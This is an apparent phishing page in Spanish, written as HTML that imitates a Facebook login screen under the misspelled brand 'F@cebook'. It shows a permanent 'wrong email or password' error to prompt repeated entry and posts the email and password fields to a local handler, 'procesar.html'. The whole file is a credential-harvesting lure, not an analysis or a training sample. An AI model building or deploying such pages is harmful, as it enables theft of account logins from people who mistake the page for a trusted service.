<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>face book</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            color: #333;
        }
        .title {
            font-size: 32px;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            width: 360px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-container h2 {
            font-size: 18px;
            color: #606770;
            margin-bottom: 20px;
        }
        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background-color: #f5f6f7;
        }
        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        .login-button:hover {
            background-color: #165cbd;
        }
        .forgot-password {
            display: block;
            margin: 15px 0;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }
        .create-account {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #42b72a;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #737373;
            text-align: center;
        }
        /* Estilo para el mensaje de error */
        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
   
    <div class="title">F@cebook</div>
    <div class="login-container">
        <h2>Iniciar sesión en F@cebook</h2>
        <!-- Mensaje de error debajo del subtítulo -->
        <div class="error-message">Contraseña o correo incorrectos</div>
        <form action="procesar.html" method="post">
            <input type="email" name="correo" placeholder="Correo electrónico" required>
            <input type="password" name="contraseña" placeholder="Contraseña" required>
            <button type="submit" class="login-button">Iniciar sesión</button>
        </form>
        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        <button class="create-account">Crear cuenta nueva</button>
    </div>
    <div class="footer">
        © 2024 Logbook
    </div>
</body>
</html>
